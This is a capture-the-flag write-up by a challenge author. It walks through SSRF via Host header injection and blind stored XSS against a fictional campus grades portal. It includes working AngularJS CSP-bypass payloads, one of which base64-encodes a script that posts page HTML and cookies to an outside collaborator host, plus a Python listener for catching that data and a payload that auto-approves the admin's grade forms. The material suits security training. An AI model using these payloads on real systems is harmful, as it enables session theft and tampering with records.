# Campus Link - Eschaton 2025

### Description:

```

So, my girlfriend, she hates academics. She's been so lazy that this semester her grades are LITERALLY 'F'. And she's blaming me for it as if I am the reason. Anyways, whats done is done. All we can do now is just sit here and whine.... or... we could just hack the portal and give her 'S' grades? I am not good at whining. Getting an all 'S' grade will make her happy and hopefully the Principal too! Here is her campus portal login credentials:

grumpycat@campuslink.com:IHateC0llege123

Solves: 0
```

Ok so this one is my masterpiece and I am actually sad that no one solved it 🥲. I always wanted to make a dynamic blind challenge and I am had so much fun while creating this and learnt a lot!
So basically the challenge gives you the following website. Where there is a campus portal and you are given the credentials of one of the user.
Now your goal, as mentioned in the description is to change the grades of the user to all S grades.

Looking at the application, after login there is a grades tab where you can request review for the grads. So just add a new grade and request a review for it and wait.

![](screenshots/Pasted%20image%2020260201010143.png)

While it is being reviewed, lets enumerate the rest of the application. Using gobuster we can find some hidden directories. On which one of the entry is interesting `server-status`.
![](screenshots/Pasted%20image%2020260201010642.png)
![](screenshots/Pasted%20image%2020260201010717.png)

ok now the error message says: no path specified. Lets try to specify a path,
![](screenshots/Pasted%20image%2020260201010746.png)

And that gives us a redirection. What else we can do? From this point most people expected a direct SSRF to the internal network, but if you think about it, why does it give a 302 redirection? Can it request something else? After playing aroumnd a bit you will try the following:

![](screenshots/Pasted%20image%2020260201011339.png)

Thats basically Host Header injection. Therefore, lets try 127.0.0.1. That gives us the same portal itself? Maybe we should change port:

![](screenshots/Pasted%20image%2020260201011413.png)
![](screenshots/Pasted%20image%2020260201011425.png)

When we change Host to 127.0.0.1:69 it gives us {"detail":"Cannot connect to target"}
Ok, so the server is trying to connect to that port. Lets try some other ports, maybe common ports:

Try common ports and:
![](screenshots/Pasted%20image%2020260201012438.png)

![](screenshots/Pasted%20image%2020260201012636.png)

Ok, interesting finding, we got a csp:

```
content-security-policy:
default-src 'self'; script-src https://cdnjs.cloudflare.com 'unsafe-eval'; style-src 'self'; img-src 'none'; font-src 'self'; connect-src *; frame-src 'none'; base-uri 'self'; form-action 'self'; object-src 'none';
```

Lets get back to our previous grade review request. Ahay we got a review.

![](screenshots/Pasted%20image%2020260201015705.png)

Ok so the bot is responding. Now reviewing our actual goal, we need to change the grades to S. So lets try to do that via blind XSS. But sure no matter what payload we try, the CSP is blocking everything. But wait, the CSP allows cdnjs.cloudflare.com for scripts. So we can use that to our advantage. Lets try searching for such a payload:

https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html

```
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

Ok lets try cooking our own payload using this idea:

First just plain javascript to fetch whats there on the admin page:

```javascript
(function () {
  // Extract the entire HTML content
  var htmlContent = document.documentElement.outerHTML;

  // Extract all cookies
  var cookies = document.cookie;

  // Prepare the data to send
  var data = {
    html: htmlContent,
    cookies: cookies,
  };

  // Send the data via POST
  fetch("http://<your-server-ip>:4444", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
})();
```

Lets encode it so that the payload delivery could be easy. After base 64 encoding that in the cloudflare angular payload:

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var s=atob("KGZ1bmN0aW9uICgpIHsKICAvLyBFeHRyYWN0IHRoZSBlbnRpcmUgSFRNTCBjb250ZW50CiAgdmFyIGh0bWxDb250ZW50ID0gZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm91dGVySFRNTDsKCiAgLy8gRXh0cmFjdCBhbGwgY29va2llcwogIHZhciBjb29raWVzID0gZG9jdW1lbnQuY29va2llOwoKICAvLyBQcmVwYXJlIHRoZSBkYXRhIHRvIHNlbmQKICB2YXIgZGF0YSA9IHsKICAgIGh0bWw6IGh0bWxDb250ZW50LAogICAgY29va2llczogY29va2llcywKICB9OwoKICAvLyBTZW5kIHRoZSBkYXRhIHZpYSBQT1NUCiAgZmV0Y2goImh0dHA6Ly9jeGR4M3dvNjdlZHBpaWJqNTJ6bWgybDF0c3pqbjlieS5vYXN0aWZ5LmNvbTo0NDQ0IiwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoZGF0YSksCiAgfSk7Cn0pKCk7");eval(s);//');}}
```

Ok at this point most of you might have given the burp collaborator link. I mean that is okay but there is an issue with it. I will show u with one such payload ( the above one). Submit and wait. It will take approx 3 minutes for the admin to review and respond.
![](screenshots/Pasted%20image%2020260201041629.png)
So basically, yes we got the hit and congrats if you reached here your payload is working fine. Except that the burps collaborator is not set for CORS. The admin user is using Chromium based browser and most of latest browsers enforce CORS by default. There fore it will first sent an OPTIONS request but because collaborator is not setup to respond to that it wont work.
You can use any method but what I do is:

1. Setup a server to handle CORS
2. Handle options request gracefully, accept all
3. Handle all methods so data can be posted and can be reused. You can code this with AI. Here is the code I used:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
import uuid
import os

OUTPUT_DIR = "."

class CORSHandler(BaseHTTPRequestHandler):
    def _set_cors_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Authorization, Content-Type")

    def log_message(self, format, *args):
        # silence default logging if you want cleaner output
        return

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        request_id = str(uuid.uuid4())
        timestamp = datetime.utcnow().isoformat()

        filename = f"request_{request_id}.txt"
        filepath = os.path.join(OUTPUT_DIR, filename)

        with open(filepath, "wb") as f:
            f.write(b"=== METADATA ===\n")
            f.write(f"Request-ID: {request_id}\n".encode())
            f.write(f"Timestamp: {timestamp} UTC\n".encode())
            f.write(f"Client: {self.client_address[0]}\n\n".encode())

            f.write(b"=== HEADERS ===\n")
            for header, value in self.headers.items():
                f.write(f"{header}: {value}\n".encode())

            f.write(b"\n=== BODY ===\n")
            f.write(body)

        # Console output (quick visibility)
        print("\n========== NEW POST ==========")
        print(f"Request-ID : {request_id}")
        print(f"From       : {self.client_address[0]}")
        print(f"Saved to   : {filename}")
        print("Body:")
        try:
            print(body.decode(errors="ignore"))
        except Exception:
            print(body)
        print("================================\n")

        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(b"OK")
print("Starting port at: 4444")
HTTPServer(("0.0.0.0", 4444), CORSHandler).serve_forever()

```

Ok once that is done just give that ip:port in the payload, encode it submit it and listen for the response:
![](screenshots/Pasted%20image%2020260201042723.png)

And there it is! We have some info. Lets parse it now. I have included the script to send the cookies also `admin_session_token` but you dont technically require that to solve the challenge. I dont think its possible to solve that way. Anyway the goal is not to hack admin. So lets decrypt admin UI:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Re-evaluation Requests - Admin</title>
    <link rel="stylesheet" href="/static/styles.css" />
  </head>

  <body>
    <nav>
      <a href="/pleas">Pleas</a>
      <a href="/logout">Logout</a>
    </nav>

    <h1>Re-evaluation Requests</h1>

    <table>
      <tr>
        <th>Student</th>
        <th>Course Code</th>
        <th>Course Name</th>
        <th>Original Grade</th>
        <th>Reason</th>
        <th>Status</th>
        <th>Action</th>
      </tr>

      <tr>
        <td>Grumpy Cat</td>
        <td>CYB301</td>
        <td>Ethical Hacking and Penetration Testing</td>
        <td>F</td>

        <td>
          <!-- AngularJS XSS payload -->
          <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
          <div ng-app>{{ EXPLOIT }}</div>
        </td>

        <td class="pending">Pending</td>

        <td>
          <form method="post" action="/pleas/2">
            <select name="status">
              <option value="Updated">Updated</option>
              <option value="Rejected">Rejected</option></select
            ><br />

            <input
              type="text"
              name="updated_grade"
              placeholder="New grade"
            /><br />

            <textarea name="feedback" placeholder="Feedback" required></textarea
            ><br />

            <button type="submit">Submit</button>
          </form>
        </td>
      </tr>
    </table>
  </body>
</html>
```

ok so that way we know how the admin UI works. So we also know the admin updates the please on the /please/<pleaeid>. So with that info create another payload, which will submit every pleas to the endpoint:
Logic is simple:
Take every form, fill up the data as soon as its loaded, set status as Updated, and updated_grade as S and a random feedback of your choice and submit. This should be done fast and as soon as angular is loaded through the cloudflare such that it will execute before the admin rejects.sd

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var
  s=atob("ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybVthY3Rpb25ePSIvcGxlYXMvIl0nKS5mb3JFYWNoKGZvcm0gPT4gewogIC8vIFNldCBzdGF0dXMgdG8gIlVwZGF0ZWQiCiAgY29uc3Qgc3RhdHVzU2VsZWN0ID0gZm9ybS5xdWVyeVNlbGVjdG9yKCdzZWxlY3RbbmFtZT0ic3RhdHVzIl0nKTsKICBpZiAoc3RhdHVzU2VsZWN0KSBzdGF0dXNTZWxlY3QudmFsdWUgPSAiVXBkYXRlZCI7CgogIC8vIFNldCBuZXcgZ3JhZGUgdG8gIlMiCiAgY29uc3QgZ3JhZGVJbnB1dCA9IGZvcm0ucXVlcnlTZWxlY3RvcignaW5wdXRbbmFtZT0idXBkYXRlZF9ncmFkZSJdJyk7CiAgaWYgKGdyYWRlSW5wdXQpIGdyYWRlSW5wdXQudmFsdWUgPSAiUyI7CgogIC8vIFNldCBmZWVkYmFjawogIGNvbnN0IGZlZWRiYWNrQXJlYSA9IGZvcm0ucXVlcnlTZWxlY3RvcigndGV4dGFyZWFbbmFtZT0iZmVlZGJhY2siXScpOwogIGlmIChmZWVkYmFja0FyZWEpIGZlZWRiYWNrQXJlYS52YWx1ZSA9ICJZb3UgZGVzZXJ2ZWQgdGhpcyI7CgogIC8vIFN1Ym1pdCB0aGUgZm9ybQogIGZvcm0uc3VibWl0KCk7Cn0pOw==");eval(s);//');}}
</div>
```

And remember, as soon as you submit the payload submit the rest of the review requests as you can get all of them changed to S.

![](screenshots/Pasted%20image%2020260201044136.png)

![](screenshots/Pasted%20image%2020260201044207.png)
